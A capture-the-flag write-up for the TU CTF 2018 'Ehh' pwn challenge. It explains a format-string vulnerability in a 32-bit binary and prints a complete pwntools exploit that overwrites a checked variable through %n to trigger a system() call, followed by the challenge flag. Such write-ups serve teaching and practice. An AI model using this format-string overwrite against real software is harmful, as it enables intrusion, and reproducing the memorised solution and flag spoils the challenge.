[](ctf=tu-ctf-2018)
[](type=pwn)
[](tags=stack-canary)
[](tools=radare2,gdb-peda,pwntools,python)

# Ehh

We are given a [binary](../ehh) which prints out the address of a variable and accepts user input.

```bash
vagrant@amy:~/share/ehh$ file ehh
ehh: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d50965fb2cafc7eb26ecbce94385e870a05d02eb, not stripped
```

The binary has a format string vulnerability which can be leveraged to overwrite the variable such that the constaint is satisfied.

```assembly
...

│           0x000006f6      8b8328000000   mov eax, dword [ebx + 0x28] ; [0x28:4]=0x200034 ; '('
│           0x000006fc      83f818         cmp eax, 0x18
│       ┌─< 0x000006ff      7512           jne 0x713
│       │   0x00000701      83ec0c         sub esp, 0xc
│       │   0x00000704      8d83d2e7ffff   lea eax, [ebx - 0x182e]
│       │   0x0000070a      50             push eax                    ; const char *string
│       │   0x0000070b      e8b0fdffff     call sym.imp.system         ; int system(const char *string)
│       │   0x00000710      83c410         add esp, 0x10
│       └─> 0x00000713      b800000000     mov eax, 0

...
```

Exploit:

```python
from pwn import *

context(arch='i386', os='linux')
# p = process('./ehh')
p = remote('18.222.213.102', 12345)

p.recvuntil('here< ')
leak = p.recvuntil('\n').strip()
leak = int(leak, 16)

target_len = 0x18
target_fmt = '%6$n'
buf_fmt = '%{}x'
payload = ''
payload += p32(leak)
payload += buf_fmt.format(target_len - len(payload))
payload += target_fmt

p.sendline(payload)
p.recvuntil('TUCTF')
flag =  'TUCTF' + p.recvuntil('\n')
log.success(flag)
```

This gives us the flag
> TUCTF{pr1n7f_15_pr377y_c00l_huh}
